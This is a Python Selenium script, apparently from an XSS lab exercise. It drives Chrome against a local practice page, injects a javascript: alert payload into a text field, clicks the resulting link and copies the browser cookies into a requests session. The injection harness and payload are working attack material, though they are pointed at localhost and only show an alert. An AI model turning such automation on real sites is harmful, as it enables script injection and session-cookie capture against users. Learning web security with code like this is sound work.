# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import requests
import time 
import os
import re
import platform
from lxml import etree
from datetime import datetime

# 登录相应网站
class spider:
    chrome_driver_path=""
    driver=NotImplemented
    main_page_url = 'http://127.0.0.1:5000/'
    main_page_title = 'XSS攻击'

    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/51.0.2704.63 Safari/537.36'}
    cookies = None
    request_session = None

    def __init__(self):
        if platform.system()=='Windows':
            self.chrome_driver_path = "chromedriver.exe"
        elif platform.system()=='Linux' or platform.system()=='Darwin':
            self.chrome_driver_path = "./chromedriver"
        else:
            print('Unknown System Type. quit...')
            return None

        requests.headers = self.headers

        try:
            r = requests.get(self.main_page_url)
        except requests.exceptions.RequestException as e:
            print('链接异常，请检查网络')
            print(e)
            quit()

        if(r.status_code!=200):
            print('http状态码错误')
            quit()

        chrome_options = Options()
        # chrome_options.add_argument('--headless') # headless不会弹出用户界面，而后台运行 
        chrome_options.add_argument('--disable-gpu') # 设置driver的属性，去掉gpu加速
        self.driver = webdriver.Chrome(chrome_options=chrome_options, \
            executable_path= self.chrome_driver_path)

        return None

    def attack(self,str):
        self.driver.get(self.main_page_url)
        time.sleep(1)
        if self.driver.title!=self.main_page_title:
            print('不是期望的主页Title，网页改版了？')
            return False
        
        # xpath的方法 定位到文本框
        elem_text=self.driver.find_element_by_id("te")
        elem_text.send_keys(str)
        # 输入回车
        elem_text.send_keys(Keys.RETURN)
        
        time.sleep(1)
        
        # driver替我们点击
        link=self.driver.find_element_by_id("link")
        link.click()
        time.sleep(1)
        
        self.cookies = self.driver.get_cookies()
        self.request_session = requests.Session()
        for cookie in self.cookies:
            self.request_session.cookies.set(cookie['name'], cookie['value'])
        return True

if __name__ == "__main__":
    xss=spider()
    xss.attack("javascript:alert('xss attacks')") 